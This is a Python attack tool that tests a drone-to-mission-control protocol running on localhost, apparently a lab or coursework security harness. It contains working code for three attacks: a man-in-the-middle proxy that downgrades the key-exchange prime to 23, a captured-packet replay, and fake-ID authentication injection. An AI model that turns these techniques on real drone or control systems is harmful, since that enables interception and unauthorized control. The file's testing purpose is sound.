import socket
import struct
import threading
import time
import sys
from crypto_utils import Helper

# Configuration
REAL_MCC_HOST = "127.0.0.1"
REAL_MCC_PORT = 9000
ATTACKER_PORT = 9001  # Drone connects here

class MitMProxy:
    def __init__(self, mode):
        self.mode = mode
        self.captured_auth_packet = None
        self.running = True

    def start(self):
        # 1. Setup Attacker Server
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(("0.0.0.0", ATTACKER_PORT))
        server.listen(1)
        
        print(f"\n[ATTACKER] Listening on port {ATTACKER_PORT}...")
        print(f"[ATTACKER] >> PLEASE RUN: python3 drone.py (ensure it connects to port {ATTACKER_PORT})")

        while self.running:
            try:
                drone_sock, addr = server.accept()
                print(f"[ATTACKER] Intercepted connection from Drone: {addr}")
                
                # Handle this connection in a thread
                handler = threading.Thread(target=self.handle_connection, args=(drone_sock,))
                handler.start()
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"[ERROR] {e}")

    def handle_connection(self, drone_sock):
        # 2. Connect to Real MCC
        try:
            mcc_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            mcc_sock.connect((REAL_MCC_HOST, REAL_MCC_PORT))
        except Exception as e:
            print(f"[ATTACKER] Failed to connect to Real MCC: {e}")
            drone_sock.close()
            return

        # 3. Relay Traffic Loop
        self.relay(drone_sock, mcc_sock)
        
        # Cleanup
        drone_sock.close()
        mcc_sock.close()

    def relay(self, drone, mcc):
        """
        Relays data between Drone and MCC.
        Inspects and Modifies data based on self.mode
        """
        mcc.setblocking(0)
        drone.setblocking(0)
        
        while True:
            # A. Read from MCC (Server) -> Send to Drone (Client)
            try:
                data = mcc.recv(4096)
                if not data: break # Connection closed
                
                # --- ATTACK VECTOR: MITM PARAMETER TAMPERING ---
                if self.mode == "MITM" and data.startswith(b'\x0a'): # Opcode 10 (Phase 0)
                    print("[ATTACKER] Phase 0 Detected! Tampering with Prime P...")
                    data = self.tamper_phase0(data)
                
                drone.sendall(data)
            except BlockingIOError:
                pass
            except Exception:
                break

            # B. Read from Drone (Client) -> Send to MCC (Server)
            try:
                data = drone.recv(4096)
                if not data: break # Connection closed
                
                # --- ATTACK VECTOR: REPLAY ATTACK CAPTURE ---
                if self.mode == "REPLAY" and data.startswith(b'\x14'): # Opcode 20 (Auth Req)
                    print("[ATTACKER] Captured AUTH_REQ packet! Storing for replay...")
                    self.captured_auth_packet = data
                
                mcc.sendall(data)
            except BlockingIOError:
                pass
            except Exception:
                break
            
            time.sleep(0.01) # Prevent CPU spin

        print("[ATTACKER] Session finished.")
        
        # Trigger Replay if ready
        if self.mode == "REPLAY" and self.captured_auth_packet:
            self.execute_replay()
            self.running = False # Stop after attack

    def tamper_phase0(self, original_data):
        """
        Replaces the valid large Prime P with a weak prime (23).
        Correctly handles nested length fields to avoid crashing the drone.
        """
        try:
            # Structure: Opcode(1) | OuterLen(4) | InnerPayload... | R(256) | S(256)
            # InnerPayload: PLen(4) | P | GLen(4) | G | ...
            
            # 1. Parse Outer Header
            opcode = original_data[0:1]
            outer_len = struct.unpack("!I", original_data[1:5])[0]
            
            # Extract Inner Payload and Signature
            # The payload starts at index 5 and ends at 5 + outer_len
            inner_payload = original_data[5:5+outer_len]
            signature = original_data[5+outer_len:] # R + S
            
            # 2. Parse Inner Payload (Find P)
            p_len = struct.unpack("!I", inner_payload[0:4])[0]
            
            # 3. Create Weak P
            weak_p = 23
            weak_p_bytes = Helper.int_to_bytes(weak_p)
            weak_p_len_bytes = struct.pack("!I", len(weak_p_bytes))
            
            # 4. Reconstruct Inner Payload
            # We keep everything AFTER the original P (G, SL, TS, etc.)
            # Original P data ended at: 4 (len bytes) + p_len
            rest_of_payload = inner_payload[4+p_len:]
            
            new_inner_payload = weak_p_len_bytes + weak_p_bytes + rest_of_payload
            
            # 5. Reconstruct Outer Packet
            # We must update the Outer Length field because the payload size changed!
            new_outer_len = struct.pack("!I", len(new_inner_payload))
            
            print(f"[ATTACKER] Replaced {p_len}-byte Prime with 1-byte Prime (23).")
            print(f"[ATTACKER] Fixed Packet Length: {outer_len} -> {len(new_inner_payload)}")
            
            return opcode + new_outer_len + new_inner_payload + signature
            
        except Exception as e:
            print(f"[ERROR] Tampering logic failed: {e}")
            return original_data

    def execute_replay(self):
        print("\n[ATTACKER] >>> LAUNCHING REPLAY ATTACK NOW <<<")
        time.sleep(1)
        try:
            replay_sock = socket.socket()
            replay_sock.connect((REAL_MCC_HOST, REAL_MCC_PORT))
            
            # 1. Consume Phase 0 (we don't care about it for the replay itself)
            replay_sock.recv(4096) 
            
            # 2. Send Captured Packet
            print("[ATTACKER] Sending captured AUTH_REQ...")
            replay_sock.sendall(self.captured_auth_packet)
            
            # 3. Check Result
            time.sleep(0.5)
            response = replay_sock.recv(1024)
            
            if not response:
                print("[RESULT] Connection Closed. MCC likely rejected the Replay (Secure).")
            elif response.startswith(b'\x1e'): # Opcode 30 (Auth Res)
                print("[RESULT] FAILURE! MCC accepted the replayed packet! (Vulnerable).")
            elif response.startswith(b'\x3c'): # Opcode 60 (Error)
                print("[RESULT] SUCCESS! MCC rejected the replay with Error Opcode.")
            else:
                print(f"[RESULT] Received Opcode: {response[0]}")
                
            replay_sock.close()
        except Exception as e:
            print(f"[ERROR] Replay failed: {e}")

# --- UNAUTHORIZED DIRECT ATTACK (No Proxy Needed) ---
def unauthorized_attack():
    print("\n[ATTACK 3] Direct Unauthorized ID Injection")
    try:
        sock = socket.socket()
        sock.connect((REAL_MCC_HOST, REAL_MCC_PORT))
        
        # Consume Phase 0
        sock.recv(4096)
        
        print("[ATTACKER] Generating Fake Auth Packet...")
        # Opcode 20 + Garbage Data
        fake_id = b"EVIL-DRONE-999".ljust(16, b'\x00')
        payload = struct.pack("!B", 20) + (b'\xFF' * 16) + fake_id + (b'\x00' * 500)
        
        sock.sendall(payload)
        
        response = sock.recv(1024)
        
        # Check for Opcode 60 (which is '<' in ASCII)
        if response == b'\x3c': 
            print("[RESULT] SUCCESS! Server rejected the request with Opcode 60 (Auth Failed).")
        elif not response:
            print("[RESULT] SUCCESS! Server closed connection immediately.")
        else:
            print(f"[RESULT] Server responded with raw data: {response}")
            
        sock.close()
    except Exception as e:
        print(f"[ERROR] {e}")

# --- MAIN MENU ---
if __name__ == "__main__":
    print("=== UAV PROTOCOL ATTACK TOOL ===")
    print(f"Targeting MCC at {REAL_MCC_HOST}:{REAL_MCC_PORT}")
    print("--------------------------------")
    print("1. MitM Parameter Tampering (Proxy)")
    print("2. Replay Attack (Proxy + Active)")
    print("3. Unauthorized Access (Direct)")
    
    choice = input("Select Attack > ").strip()
    
    if choice == '1':
        proxy = MitMProxy("MITM")
        proxy.start()
    elif choice == '2':
        proxy = MitMProxy("REPLAY")
        proxy.start()
    elif choice == '3':
        unauthorized_attack()
    else:
        print("Invalid choice.")